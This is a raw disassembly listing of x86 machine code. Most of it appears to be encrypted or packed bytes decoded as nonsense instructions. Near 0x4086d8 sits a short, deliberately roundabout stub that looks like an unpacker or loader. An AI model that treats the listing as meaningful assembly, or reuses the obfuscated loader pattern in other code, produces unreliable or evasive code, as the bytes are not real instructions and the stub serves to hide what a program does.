  4080a4:	(bad)  
  4080a6:	imul   ebx,DWORD PTR [esp+edi*2],0xc91099f1
  4080ad:	loopne 0x408052
  4080af:	cwde   
  4080b0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4080b1:	test   BYTE PTR [ebx-0x13],dh
  4080b4:	adc    al,BYTE PTR [eax-0x1236531c]
  4080ba:	sbb    DWORD PTR ds:0xb31576a7,eax
  4080c0:	or     dl,BYTE PTR [ecx+ebx*8]
  4080c3:	pop    ecx
  4080c4:	ja     0x4080e4
  4080c6:	retf   0x9d3
  4080c9:	push   esi
  4080ca:	or     edx,DWORD PTR [ecx]
  4080cc:	lods   eax,DWORD PTR ds:[esi]
  4080cd:	mov    eax,cs:0x8e84f62d
  4080d3:	fisubr WORD PTR [ebx+0x70]
  4080d6:	xor    BYTE PTR [edi-0x43],0x4
  4080da:	fcom   QWORD PTR [esi-0x60edb6b8]
  4080e0:	add    al,0xcd
  4080e2:	imul   ebp,ebx,0xd0607a62
  4080e8:	adc    DWORD PTR [edx+eiz*2],ebp
  4080eb:	(bad)
  4080ee:	adc    BYTE PTR [esi-0x26],al
  4080f1:	out    0x85,eax
  4080f3:	sti    
  4080f4:	fs in  eax,dx
  4080f6:	pop    ebp
  4080f7:	test   BYTE PTR [eax-0x5e96a111],dl
  4080fd:	adc    edi,edx
  4080ff:	and    bl,BYTE PTR [eax-0x4b]
  408102:	out    0x6e,al
  408104:	jne    0x408139
  408106:	add    esi,ebp
  408108:	inc    edx
  408109:	ss push ecx
  40810b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40810c:	sti    
  40810d:	ret    
  40810e:	xchg   ecx,eax
  40810f:	je     0x408160
  408111:	outs   dx,DWORD PTR ds:[esi]
  408112:	jb     0x4080d8
  408114:	lock sbb eax,0x6aa6ba8d
  40811a:	sub    al,0xee
  40811c:	mov    esi,gs
  40811e:	pop    esi
  40811f:	je     0x4080e1
  408121:	or     DWORD PTR [esi],edi
  408123:	js     0x4080f6
  408125:	bound  ecx,QWORD PTR [ecx+0x17fd0fe7]
  40812b:	push   edx
  40812c:	mov    cl,0xc6
  40812e:	xchg   ebx,eax
  40812f:	pop    ebp
  408130:	dec    ebp
  408131:	fisub  DWORD PTR ss:[ecx]
  408134:	mov    al,ds:0x60e68a5f
  408139:	and    DWORD PTR [ebx+0x44],eax
  40813c:	ret    0xb23b
  40813f:	sub    DWORD PTR [ecx],ebp
  408141:	out    dx,eax
  408142:	jmp    0x8c0eaec0
  408147:	cmc    
  408148:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408149:	cmc    
  40814a:	mov    ?,WORD PTR [ebx-0x67]
  40814d:	mov    cl,0xed
  40814f:	scas   al,BYTE PTR es:[edi]
  408150:	jae    0x408177
  408152:	(bad)  
  408153:	rol    BYTE PTR [esi],1
  408155:	test   eax,0x663a69a6
  40815a:	imul   edi,ebp,0xffffffb0
  40815d:	dec    eax
  40815e:	sbb    DWORD PTR [edi],ebp
  408160:	inc    ecx
  408161:	inc    esp
  408162:	jnp    0x408113
  408164:	dec    edi
  408165:	fld    DWORD PTR [esi-0x4b13450f]
  40816b:	fimul  DWORD PTR [eax-0x52]
  40816e:	(bad)  
  40816f:	fcomp  st(3)
  408171:	in     eax,dx
  408172:	stos   DWORD PTR es:[edi],eax
  408173:	cmp    DWORD PTR [esp+ecx*2+0x4842cbbf],edi
  40817a:	jo     0x408113
  40817c:	jno    0x40810c
  40817e:	lock (bad) [ebp-0x48]
  408182:	adc    BYTE PTR [ecx],bl
  408184:	xchg   esi,eax
  408185:	out    dx,eax
  408186:	cld    
  408187:	imul   ecx,DWORD PTR [ecx],0xffffff87
  40818a:	sub    eax,0x51ded281
  40818f:	inc    esi
  408190:	out    dx,eax
  408191:	add    eax,0xd5340db7
  408196:	call   DWORD PTR [ebx+edi*1+0x31983359]
  40819d:	push   edi
  40819e:	pop    es
  40819f:	test   BYTE PTR [ecx],al
  4081a1:	clc    
  4081a2:	lahf   
  4081a3:	aas    
  4081a4:	inc    esi
  4081a5:	cld    
  4081a6:	daa    
  4081a7:	add    bh,BYTE PTR [ecx-0x18fba1fd]
  4081ad:	pop    ebp
  4081ae:	xor    eax,0x5f6499a8
  4081b3:	pop    edi
  4081b4:	or     ch,bh
  4081b6:	xchg   edx,eax
  4081b7:	xor    DWORD PTR [eax],esi
  4081b9:	push   0xffffffa8
  4081bb:	call   0xc11ea8d3
  4081c0:	push   edx
  4081c1:	faddp  st(3),st
  4081c3:	mov    ch,0x6a
  4081c5:	icebp  
  4081c6:	(bad)  
  4081c7:	fcom   DWORD PTR ds:0xa64d3f68
  4081cd:	fstp   QWORD PTR [ecx-0x20e40023]
  4081d3:	mov    cs,WORD PTR [esi]
  4081d5:	(bad)  
  4081d6:	and    eax,ebp
  4081d8:	(bad)  
  4081d9:	pop    eax
  4081da:	push   ebp
  4081db:	scas   al,BYTE PTR es:[edi]
  4081dc:	push   esp
  4081dd:	shl    BYTE PTR [ecx+esi*2],cl
  4081e0:	cmp    eax,0x22c22ceb
  4081e5:	cwde   
  4081e6:	push   0x71ee8330
  4081eb:	scas   eax,DWORD PTR es:[edi]
  4081ec:	pop    edi
  4081ed:	cmp    eax,0x5e5990f
  4081f2:	retf   
  4081f3:	sub    eax,0xc9d843a4
  4081f8:	fisttp WORD PTR [eax+0x346ab0b5]
  4081fe:	call   0xec9d:0xea7965c2
  408205:	add    ecx,DWORD PTR [edx]
  408207:	sbb    al,0x86
  408209:	ret    
  40820a:	xchg   ecx,eax
  40820b:	jae    0x408213
  40820d:	pop    esi
  40820e:	ins    BYTE PTR es:[edi],dx
  40820f:	xor    ebp,DWORD PTR [eax-0x49483df0]
  408215:	push   eax
  408216:	shl    DWORD PTR [edi+0x31bd5e5f],cl
  40821c:	cmc    
  40821d:	stos   BYTE PTR es:[edi],al
  40821e:	mov    ebx,0x76e39b49
  408223:	dec    ebx
  408224:	sub    al,0xd6
  408226:	or     eax,0x1dcc321c
  40822b:	lods   eax,DWORD PTR ds:[esi]
  40822c:	mov    al,0x52
  40822e:	mov    dh,0xda
  408230:	xlat   BYTE PTR ds:[ebx]
  408231:	mov    ds:0xd40d2a2a,eax
  408236:	sub    edi,DWORD PTR [esi]
  408238:	retf   
  408239:	mov    edx,0xaf25957c
  40823e:	imul   ecx,ebp,0x968dd0d5
  408244:	push   ds
  408245:	adc    cl,dl
  408247:	clc    
  408248:	and    BYTE PTR [edi-0x1a93b200],0x4b
  40824f:	fcomp  QWORD PTR [eax-0x35]
  408252:	xchg   ebx,eax
  408253:	dec    ecx
  408254:	sub    al,0xdf
  408256:	fwait
  408257:	xor    DWORD PTR [edi],eax
  408259:	mov    ds:0x5a0f7608,eax
  40825e:	ret    0x7b2f
  408261:	fmul   st,st(7)
  408263:	mov    ebx,0xa3935cae
  408268:	inc    esp
  408269:	xchg   ecx,eax
  40826a:	rol    al,0xca
  40826d:	jns    0x40820f
  40826f:	out    dx,al
  408270:	sar    BYTE PTR [ebx],1
  408272:	leave  
  408273:	dec    ebx
  408274:	push   esi
  408275:	dec    ecx
  408276:	scas   eax,DWORD PTR es:[edi]
  408277:	rol    DWORD PTR [eax+edi*4-0x69ed7518],0x3b
  40827f:	mov    BYTE PTR [ebx+0x13],dh
  408282:	and    DWORD PTR [esi+0x6b],ebp
  408285:	mov    edi,0x956843f4
  40828a:	ins    DWORD PTR es:[edi],dx
  40828b:	dec    ebp
  40828c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40828d:	clc    
  40828e:	mov    ebp,0x4fb224e7
  408293:	bound  eax,QWORD PTR ds:0xbd9fe64b
  408299:	jl     0x408239
  40829b:	mov    ecx,0xb9389cab
  4082a0:	test   DWORD PTR [eax+esi*8-0xa],edx
  4082a4:	mov    ds:0xfd690f99,eax
  4082a9:	loopne 0x4082f0
  4082ab:	call   FWORD PTR [edx+edx*4+0x6ba11f5b]
  4082b2:	push   ecx
  4082b3:	sbb    ebx,DWORD PTR [edx]
  4082b5:	push   cs
  4082b6:	xor    esi,0x2b5ac86
  4082bc:	lahf   
  4082bd:	inc    edx
  4082be:	popa   
  4082bf:	sub    edx,DWORD PTR [esp+edx*4+0x13c47d9f]
  4082c6:	inc    edx
  4082c7:	and    al,0xe6
  4082c9:	pop    ss
  4082ca:	rcr    DWORD PTR ds:0x9d97c249,1
  4082d0:	mov    esp,0x4cd175e9
  4082d5:	lods   eax,DWORD PTR cs:[esi]
  4082d7:	sahf   
  4082d8:	ret    
  4082d9:	ins    DWORD PTR es:[edi],dx
  4082da:	jne    0x40828a
  4082dc:	cmc    
  4082dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082de:	lahf   
  4082df:	pop    ebx
  4082e0:	cmp    eax,0x9f45abd4
  4082e5:	fdiv   DWORD PTR [esi+0xa]
  4082e8:	sub    edx,DWORD PTR [edx-0x3c]
  4082eb:	outs   dx,DWORD PTR ds:[esi]
  4082ec:	push   eax
  4082ed:	push   eax
  4082ee:	pop    ebp
  4082ef:	cmp    ebx,DWORD PTR [edi-0x51781fb3]
  4082f5:	xchg   BYTE PTR [edx],ch
  4082f7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4082f8:	adc    bl,BYTE PTR [esi+0x1205d0e5]
  4082fe:	xchg   esp,eax
  4082ff:	push   0xffffffa5
  408301:	add    ah,BYTE PTR [ebp-0x4984cbff]
  408307:	ret    
  408308:	push   edi
  408309:	jo     0x4082c3
  40830b:	inc    ebx
  40830c:	loopne 0x4082a7
  40830e:	out    dx,al
  40830f:	xchg   BYTE PTR [edx+0x33],dh
  408312:	pushf  
  408313:	arpl   ax,ax
  408315:	xlat   BYTE PTR ds:[ebx]
  408316:	add    dh,BYTE PTR [esi]
  408318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408319:	adc    al,0x73
  40831b:	jp     0x4082d5
  40831d:	jge    0x408337
  40831f:	jmp    0xe3518aa1
  408324:	push   ds
  408325:	xchg   edx,eax
  408326:	idiv   DWORD PTR [edi-0x42]
  408329:	add    eax,DWORD PTR [edi]
  40832b:	(bad)  
  40832d:	push   edi
  40832e:	addr16 xchg edx,eax
  408330:	dec    edi
  408331:	or     BYTE PTR [eax+0x38],0x1c
  408335:	dec    edx
  408336:	mov    cl,0x19
  408338:	pop    esi
  408339:	mov    edx,0xcaccaf3a
  40833e:	dec    esi
  40833f:	xchg   ebx,eax
  408340:	pop    ebp
  408341:	mov    al,0xc6
  408343:	sbb    DWORD PTR [eax+0x6a],0xffffff98
  408347:	xor    esi,DWORD PTR [edx-0x69a26f06]
  40834d:	jns    0x408302
  40834f:	(bad)
  408353:	jno    0x40834b
  408355:	(bad)  
  408356:	xor    al,0xef
  408358:	outs   dx,DWORD PTR ds:[esi]
  408359:	ds (bad) 
  40835b:	sbb    DWORD PTR [edi-0x60],eax
  40835e:	stos   DWORD PTR es:[edi],eax
  40835f:	cmp    cl,BYTE PTR [ebp+ebx*1+0x5b]
  408363:	add    al,0xa7
  408365:	sub    al,0x8f
  408367:	sub    ecx,DWORD PTR [edx-0x6b]
  40836a:	test   al,0x9
  40836c:	dec    esp
  40836d:	loope  0x40837e
  40836f:	jbe    0x40837a
  408371:	call   0xc68d:0x7d8fb286
  408378:	and    ch,BYTE PTR [esi+ebp*4-0x6]
  40837c:	inc    esp
  40837d:	scas   eax,DWORD PTR es:[edi]
  40837e:	push   esp
  40837f:	jbe    0x4083c8
  408381:	add    al,0x81
  408383:	mov    ah,0x87
  408385:	dec    ebp
  408386:	scas   eax,DWORD PTR es:[edi]
  408387:	jmp    0xe6dc:0x8eae2ac3
  40838e:	jno    0x4083a7
  408390:	jmp    0x40832f
  408392:	push   edi
  408393:	push   edx
  408394:	add    ah,bh
  408396:	scas   eax,DWORD PTR es:[edi]
  408397:	imul   DWORD PTR [edx-0x2dfa0027]
  40839d:	dec    esi
  40839e:	adc    eax,DWORD PTR [ebx+esi*2-0x1f25dde4]
  4083a5:	imul   DWORD PTR [edi+esi*8-0x717dbe1c]
  4083ac:	hlt    
  4083ad:	cmp    al,0x53
  4083af:	stos   DWORD PTR es:[edi],eax
  4083b0:	jns    0x4083c3
  4083b2:	lods   eax,DWORD PTR ds:[esi]
  4083b3:	pop    edx
  4083b4:	imul   esp,DWORD PTR [eax-0x2ef510a6],0xffffffd3
  4083bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4083bc:	push   es
  4083bd:	dec    ebp
  4083be:	inc    esi
  4083bf:	mov    WORD PTR [eax-0x32],ds
  4083c2:	adc    al,0x44
  4083c4:	jne    0x408402
  4083c6:	sub    bl,BYTE PTR [bx+di]
  4083c9:	inc    eax
  4083ca:	pusha  
  4083cb:	sub    eax,0x1d70744b
  4083d0:	mov    dh,0x38
  4083d2:	lock lock shl bh,cl
  4083d6:	jg     0x4083bb
  4083d8:	add    al,0xce
  4083da:	jmp    0x58d2d11e
  4083df:	mov    al,0x38
  4083e1:	push   esp
  4083e2:	xchg   BYTE PTR [edi+0x611d22d],dl
  4083e8:	gs jp  0x408401
  4083eb:	pop    ebp
  4083ec:	aas    
  4083ed:	sub    BYTE PTR [edi],cl
  4083ef:	ret    
  4083f0:	retf   0x9f8d
  4083f3:	mov    edx,0x3ce77622
  4083f8:	mov    ss,WORD PTR [ebx]
  4083fa:	mov    ds:0xfe1a908c,eax
  4083ff:	cmc    
  408400:	push   esi
  408401:	pop    ss
  408402:	xor    cl,BYTE PTR [esi]
  408404:	mul    DWORD PTR [esi+0x450dd00d]
  40840a:	out    0xef,eax
  40840c:	sub    esp,ebp
  40840e:	into   
  40840f:	lock std 
  408411:	es inc edi
  408413:	je     0x408491
  408415:	in     al,0xce
  408417:	fs jnp 0x40845a
  40841a:	aam    0x60
  40841c:	xor    al,0x1f
  40841e:	xchg   ecx,eax
  40841f:	(bad)  
  408420:	mov    esp,?
  408422:	push   ebx
  408423:	pusha  
  408424:	aaa    
  408425:	push   0x13
  408427:	add    ecx,ebp
  408429:	dec    edx
  40842a:	mov    ds:0x2d0ab5f6,al
  408430:	pandn  mm2,mm4
  408433:	xchg   ebp,eax
  408434:	inc    edx
  408435:	add    BYTE PTR [eax],ah
  408437:	inc    sp
  40843a:	int3   
  40843b:	or     DWORD PTR [ebp-0x49ee0efd],0x4e4422c3
  408445:	push   esi
  408446:	stc    
  408447:	dec    eax
  408448:	(bad)  
  408449:	xchg   ebx,eax
  40844a:	sar    dl,1
  40844c:	out    dx,al
  40844d:	sub    ebx,ebp
  40844f:	mov    bh,0x97
  408451:	add    DWORD PTR [ebx-0x2],0x14a1b5f
  408458:	cmc    
  408459:	inc    esp
  40845a:	dec    edi
  40845b:	adc    al,0x52
  40845d:	pop    ebx
  40845e:	(bad)  
  40845f:	xchg   edi,eax
  408460:	xor    eax,0x52cf663d
  408465:	push   ecx
  408466:	push   ebp
  408467:	mov    bh,0x32
  408469:	out    dx,eax
  40846a:	or     bh,BYTE PTR [ebx]
  40846c:	mov    WORD PTR [edi+0x57d50b6],cs
  408472:	jl     0x40845e
  408474:	stc    
  408475:	retf   
  408476:	xchg   ebp,eax
  408477:	xor    DWORD PTR [ecx],ebx
  408479:	(bad)  
  40847a:	xor    eax,0xb10501b0
  40847f:	inc    edi
  408480:	scas   al,BYTE PTR es:[edi]
  408481:	sbb    BYTE PTR [ebx+0x4a],al
  408484:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408485:	lds    esi,FWORD PTR [edx+0x7e11032]
  40848b:	sbb    al,0x24
  40848d:	out    0xa6,eax
  40848f:	lock jno 0x408449
  408492:	shr    DWORD PTR [edx+0x751a6ed1],cl
  408498:	jo     0x40841f
  40849a:	mov    dl,0xe5
  40849c:	and    esp,eax
  40849e:	pusha  
  40849f:	or     DWORD PTR [eax-0x3a],edi
  4084a2:	lahf   
  4084a3:	mov    dh,0x31
  4084a5:	fisub  DWORD PTR ds:0x85e3eb66
  4084ab:	adc    al,0x5b
  4084ad:	ins    BYTE PTR es:[edi],dx
  4084ae:	pop    ebx
  4084af:	(bad)  
  4084b0:	idiv   BYTE PTR [eax]
  4084b2:	jnp    0x408461
  4084b4:	std    
  4084b5:	xor    eax,0x9ef6dde6
  4084ba:	addr16 sub al,0xb0
  4084bd:	ins    BYTE PTR es:[edi],dx
  4084be:	adc    DWORD PTR [eax],edi
  4084c0:	inc    eax
  4084c1:	stc    
  4084c2:	or     edx,DWORD PTR ds:0xb38d44d9
  4084c8:	sar    edx,1
  4084ca:	jecxz  0x40853e
  4084cc:	fnstenv [ecx+0x42]
  4084cf:	lea    ecx,[ecx-0x2a]
  4084d2:	pop    ecx
  4084d3:	test   al,0xc4
  4084d5:	mov    DWORD PTR [eax+0x3f],ebx
  4084d8:	mov    cl,0x29
  4084da:	cli    
  4084db:	pop    ecx
  4084dc:	arpl   WORD PTR [ebp+0x1f],dx
  4084df:	pop    ds
  4084e0:	(bad)  
  4084e1:	js     0x40851f
  4084e3:	add    cl,BYTE PTR [ecx-0x21]
  4084e6:	mov    cs,WORD PTR [edi]
  4084e8:	or     eax,0xc52b7055
  4084ed:	(bad)  
  4084ee:	sar    ch,cl
  4084f0:	mov    dl,0xca
  4084f2:	and    ebx,DWORD PTR [esi+0x1]
  4084f5:	or     eax,0x6eeb922e
  4084fa:	mov    dh,0x50
  4084fc:	dec    eax
  4084fd:	pop    ss
  4084fe:	arpl   WORD PTR ss:[edx-0x4],bx
  408502:	fsubr  DWORD PTR [esi+eiz*2-0x47]
  408506:	dec    edx
  408507:	int3   
  408508:	fsubr  st,st(3)
  40850a:	add    esi,ebp
  40850c:	cwde   
  40850d:	outs   dx,BYTE PTR ds:[esi]
  40850e:	and    eax,0xb8c9fef9
  408513:	sbb    BYTE PTR [ecx],ah
  408515:	pop    edi
  408516:	push   edx
  408517:	cmp    BYTE PTR [eax],ch
  408519:	xchg   ecx,eax
  40851a:	int    0x14
  40851c:	lods   eax,DWORD PTR ds:[esi]
  40851d:	leave  
  40851e:	daa    
  40851f:	or     eax,0x5bd6cdf8
  408524:	xchg   edi,eax
  408525:	fbld   TBYTE PTR [edx+0x7d521a07]
  40852b:	ins    DWORD PTR es:[edi],dx
  40852c:	test   ecx,ecx
  40852e:	add    dl,cl
  408530:	nop
  408531:	mov    ecx,0x4bd1f3a3
  408536:	xor    eax,0xee4872cd
  40853b:	dec    ecx
  40853c:	shr    DWORD PTR [eax+0x7a],cl
  40853f:	dec    ebp
  408540:	xlat   BYTE PTR ds:[ebx]
  408541:	push   edx
  408542:	xlat   BYTE PTR ds:[ebx]
  408543:	imul   ebp,DWORD PTR [edi-0x70d6f747],0x6b
  40854a:	jmp    DWORD PTR [esi]
  40854c:	das    
  40854d:	inc    ebx
  40854e:	fidiv  WORD PTR [edi*8+0x257df18f]
  408555:	mov    eax,ds:0x3e20f46c
  40855a:	call   0x6d6b:0x5c79317d
  408561:	test   BYTE PTR [ebx+edx*2],al
  408564:	in     eax,dx
  408565:	inc    edx
  408566:	mov    ebp,DWORD PTR ds:0x8d935636
  40856c:	dec    edi
  40856d:	push   ds
  40856e:	and    eax,0xbc00bf5f
  408573:	and    BYTE PTR [edx],bh
  408575:	adc    dh,BYTE PTR [eax+edx*8]
  408578:	mov    edi,DWORD PTR [ebx-0x55]
  40857b:	lds    eax,FWORD PTR [edi]
  40857d:	jne    0x408568
  40857f:	and    DWORD PTR cs:[eax-0x3f],ecx
  408583:	xor    eax,0x276e5856
  408588:	xor    al,0x76
  40858a:	xor    bl,ah
  40858c:	popa   
  40858d:	shl    DWORD PTR ds:0x2630e9ae,cl
  408593:	adc    BYTE PTR [eax-0x599faac4],dh
  408599:	retf   0x94b9
  40859c:	(bad)  
  40859d:	push   cs
  40859e:	mov    esi,0x69671981
  4085a3:	add    eax,0x1d6c77dc
  4085a8:	add    al,0x3f
  4085aa:	jno    0x40862a
  4085ac:	jns    0x408612
  4085ae:	rol    DWORD PTR [esp+ebx*8+0x5c],0xce
  4085b3:	out    0xc1,al
  4085b5:	sbb    eax,0x79e3038a
  4085ba:	stos   BYTE PTR es:[edi],al
  4085bb:	lds    esp,FWORD PTR [ebp+0x27b9f9a]
  4085c1:	mul    DWORD PTR [ebp+0x5b]
  4085c4:	adc    al,0xd0
  4085c6:	xor    ebp,edx
  4085c8:	dec    ecx
  4085c9:	aam    0x1a
  4085cb:	add    cl,ch
  4085cd:	scas   eax,DWORD PTR es:[edi]
  4085ce:	icebp  
  4085cf:	mov    cl,0xbb
  4085d1:	mov    BYTE PTR [ecx-0xb61df32],dh
  4085d7:	jbe    0x408591
  4085d9:	mov    ds:0xa29a9fd9,al
  4085de:	mov    al,BYTE PTR [edi+ecx*1-0x34]
  4085e2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4085e3:	jg     0x408590
  4085e5:	jne    0x40859f
  4085e7:	inc    eax
  4085e8:	aaa    
  4085e9:	push   ss
  4085ea:	in     al,dx
  4085eb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4085ec:	mov    esi,0x10ea5c8d
  4085f1:	adc    DWORD PTR [edx-0x1bcc4f00],edx
  4085f7:	mov    edx,0xa2000daf
  4085fc:	stos   BYTE PTR es:[edi],al
  4085fd:	xchg   BYTE PTR [ecx+ecx*4+0x57cb4de0],al
  408604:	adc    al,0xfa
  408606:	das    
  408607:	fdiv   QWORD PTR [edi]
  408609:	jne    0x40862b
  40860b:	or     eax,0xcb3ca113
  408610:	dec    esi
  408611:	into   
  408612:	xchg   DWORD PTR ds:0xc907e4ce,edx
  408618:	sbb    al,0x5e
  40861a:	jg     0x408660
  40861c:	into   
  40861d:	ret    
  40861e:	sti    
  40861f:	arpl   WORD PTR ds:0x28619573,di
  408625:	jl     0x4085f3
  408627:	cmp    esi,DWORD PTR [ecx]
  408629:	cdq    
  40862a:	xor    eax,0x4fd3163
  40862f:	xor    cl,BYTE PTR [edi-0x44f444e6]
  408635:	adc    eax,DWORD PTR [ecx-0x27]
  408638:	iret   
  408639:	shr    esp,0x2e
  40863c:	push   ds
  40863d:	adc    edi,edi
  40863f:	arpl   WORD PTR [ebx+0x44],si
  408642:	add    edi,esi
  408644:	lods   eax,DWORD PTR ds:[esi]
  408645:	and    DWORD PTR [ecx+0x3d],ebx
  408648:	outs   dx,BYTE PTR ds:[esi]
  408649:	pop    es
  40864a:	rol    esi,cl
  40864c:	iret   
  40864d:	add    ecx,esp
  40864f:	or     al,0xbe
  408651:	leave  
  408652:	cmc    
  408653:	icebp  
  408654:	stos   BYTE PTR es:[edi],al
  408655:	ficom  DWORD PTR [edi+0x3e814910]
  40865b:	inc    edi
  40865c:	loopne 0x408667
  40865e:	cmc    
  40865f:	add    DWORD PTR [edi-0x1c],esp
  408662:	adc    cl,BYTE PTR [edx]
  408664:	enter  0x6225,0x73
  408668:	and    BYTE PTR [ecx+esi*8+0x8],0xfd
  40866d:	clc    
  40866e:	rcl    bh,1
  408670:	lock or esi,ecx
  408673:	mov    esi,0x90166073
  408678:	ins    DWORD PTR es:[edi],dx
  408679:	ins    DWORD PTR es:[edi],dx
  40867a:	jg     0x408607
  40867c:	dec    eax
  40867d:	dec    ebx
  40867e:	imul   edi,DWORD PTR [eax+0x3142f591],0xffffffa3
  408685:	sub    ebp,edi
  408687:	cmp    al,0xc3
  408689:	xor    dh,BYTE PTR [edx]
  40868b:	out    dx,al
  40868c:	push   edi
  40868d:	cld    
  40868e:	mov    ebp,DWORD PTR [ecx-0x33707dce]
  408694:	mov    ch,0xe0
  408696:	mov    ds:0x3fd4585b,eax
  40869b:	adc    BYTE PTR [eax-0xcadc9d3],al
  4086a1:	add    BYTE PTR [eax-0xaeae1cf],ch
  4086a7:	aas    
  4086a8:	xchg   edi,eax
  4086a9:	shl    DWORD PTR [esi-0x5b3019e7],cl
  4086af:	test   DWORD PTR [esi-0x80],edx
  4086b2:	jmp    0x4ad1e618
  4086b7:	addr16 xor eax,0x251a854e
  4086bd:	retf   
  4086be:	adc    bh,BYTE PTR [edx]
  4086c0:	push   es
  4086c1:	fist   DWORD PTR [edi]
  4086c3:	in     al,0x6b
  4086c5:	call   0x88ec:0xd7f669fe
  4086cc:	mov    esi,0xda89c78c
  4086d1:	int3   
  4086d2:	ud1    eax,esi
  4086d5:	retf   0x4393
  4086d8:	push   0x3
  4086da:	xor    edx,edx
  4086dc:	pop    edx
  4086dd:	add    edx,0x8
  4086e0:	push   edx
  4086e1:	pop    ecx
  4086e2:	push   0x6
  4086e4:	dec    ecx
  4086e5:	pop    ebx
  4086e6:	dec    ebx
  4086e7:	xchg   ebx,ecx
  4086e9:	sub    ebx,ecx
  4086eb:	xchg   ebx,ecx
  4086ed:	dec    ecx
  4086ee:	mov    eax,DWORD PTR [ebp-0x1c]
  4086f1:	imul   eax,ecx
  4086f4:	sub    esp,eax
  4086f6:	mov    DWORD PTR [ebp-0x20],esp
  4086f9:	mov    eax,DWORD PTR [ebp-0x4]
  4086fc:	mov    ecx,0x7510893
  408701:	jmp    0x40aa90
  408706:	dec    edi
  408707:	mov    al,0x72
  408709:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40870a:	mov    cl,0x64
  40870c:	mov    ds:0xbf3f0e63,eax
  408711:	mov    eax,0xcb02a51f
  408716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408717:	sbb    BYTE PTR [edx+0x62],ah
  40871a:	adc    BYTE PTR [edi+0x62],bl
  40871d:	bound  esi,QWORD PTR [ebx]
  40871f:	mov    DWORD PTR [edx],edi
  408721:	outs   dx,DWORD PTR ss:[esi]
  408723:	es stos BYTE PTR es:[edi],al
  408725:	add    dh,BYTE PTR [edi+ebx*2-0x52063414]
  40872c:	jno    0x408799
  40872e:	cmp    ebp,DWORD PTR [edx+0x7c]
  408731:	int3   
  408732:	cld    
  408733:	push   ebx
  408734:	sub    edi,0x8750539c
  40873a:	xchg   ebx,eax
  40873b:	pusha  
  40873c:	cld    
  40873d:	fidiv  DWORD PTR [eax+0x56]
  408740:	mov    al,ds:0x357660d4
  408745:	loope  0x4087ae
  408747:	pop    ecx
  408748:	rcr    ebp,1
  40874a:	mov    esp,0xcd7e5277
  40874f:	jb     0x408720
  408751:	loopne 0x40879e
  408753:	inc    edi
  408754:	pop    esp
  408755:	das    
  408756:	jns    0x4087b1
  408758:	out    dx,eax
  408759:	hlt    
  40875a:	jae    0x4087a2
  40875c:	mov    DWORD PTR [esi+edx*1-0x38],edx
  408760:	mov    WORD PTR [ebp-0x1d],?
  408763:	test   DWORD PTR [ebp+0x20],esi
  408766:	das    
  408767:	push   0x98246551
  40876c:	add    ebx,eax
  40876e:	xchg   BYTE PTR [ecx+0x3d4719eb],dl
  408774:	pop    es
  408775:	mov    ds:0x5fd8b7d3,eax
  40877a:	dec    edx
  40877b:	sub    eax,0x184c382f
  408780:	sahf   
  408781:	call   0xa1fed1f0
  408786:	aas    
  408787:	out    dx,eax
  408788:	cmp    ebx,DWORD PTR [ebx-0x49]
  40878b:	mov    al,0xdf
  40878d:	jge    0x4087cf
  40878f:	jmp    0x90f:0x6c5c4f2
  408796:	lods   eax,DWORD PTR ds:[esi]
  408797:	push   cs
  408798:	test   eax,0xd7e045ce
  40879d:	inc    esp
  40879e:	imul   eax
  4087a0:	adc    esi,DWORD PTR [ecx+0x4674222c]
  4087a6:	lock xchg esp,eax
  4087a8:	mov    ch,BYTE PTR [ebp-0x530b7997]
  4087ae:	gs xchg ecx,eax
  4087b0:	in     al,dx
  4087b1:	push   esp
  4087b2:	cmc    
  4087b3:	inc    edx
  4087b4:	lock push ss
  4087b6:	jl     0x4087d1
  4087b8:	fsub   QWORD PTR [edi+eax*1]
  4087bb:	sbb    al,0x1c
  4087bd:	data16 add al,BYTE PTR [ebp-0x5b]
  4087c1:	out    0xd7,al
  4087c3:	ss push ss
  4087c5:	push   0x326f3704
  4087ca:	sbb    eax,0x53b0e75d
  4087cf:	ss (bad) 
  4087d1:	xchg   esp,eax
  4087d2:	js     0x40882e
  4087d4:	popf   
  4087d5:	mov    ecx,0x713f26d6
  4087da:	and    eax,0x75fb57c5
  4087df:	cmp    edx,DWORD PTR [ebx-0x7dd1186d]
  4087e5:	lds    ecx,FWORD PTR [edx-0x4c]
  4087e8:	stos   BYTE PTR es:[edi],al
  4087e9:	lods   al,BYTE PTR ds:[esi]
  4087ea:	adc    BYTE PTR [esi],bl
  4087ec:	jge    0x4087ed
  4087ee:	stc    
  4087ef:	pusha  
  4087f0:	inc    esp
  4087f1:	add    al,0x69
  4087f3:	sub    BYTE PTR [ecx+eax*2],ah
  4087f6:	dec    ebp
  4087f7:	pop    edx
  4087f8:	out    0x3,al
  4087fa:	add    BYTE PTR [esi-0x54],al
  4087fd:	stos   BYTE PTR es:[edi],al
  4087fe:	(bad)  
  4087ff:	fucomi st,st(1)
  408801:	setle  BYTE PTR [ecx]
  408804:	imul   ebx,DWORD PTR [edi+0x54],0x4c76e9df
  40880b:	sub    cl,BYTE PTR [edi+ecx*4]
  40880e:	jg     0x40886c
  408810:	mov    BYTE PTR [ebx],cl
  408812:	xor    edx,DWORD PTR [edx+0x62]
  408815:	rcr    BYTE PTR [edx+0x1e17bdab],cl
  40881b:	psllq  mm7,mm4
  40881e:	mov    edx,0x68311b0b
  408823:	retf   0x2360
  408826:	fcmovne st,st(0)
  408828:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408829:	loope  0x4087b2
  40882b:	fmul   QWORD PTR [edi+0x1c]
  40882e:	xor    dh,BYTE PTR [esi+0x60643165]
  408834:	sub    dl,BYTE PTR [esp+edi*8-0x56]
  408838:	xchg   esp,eax
  408839:	fdiv   DWORD PTR [ecx]
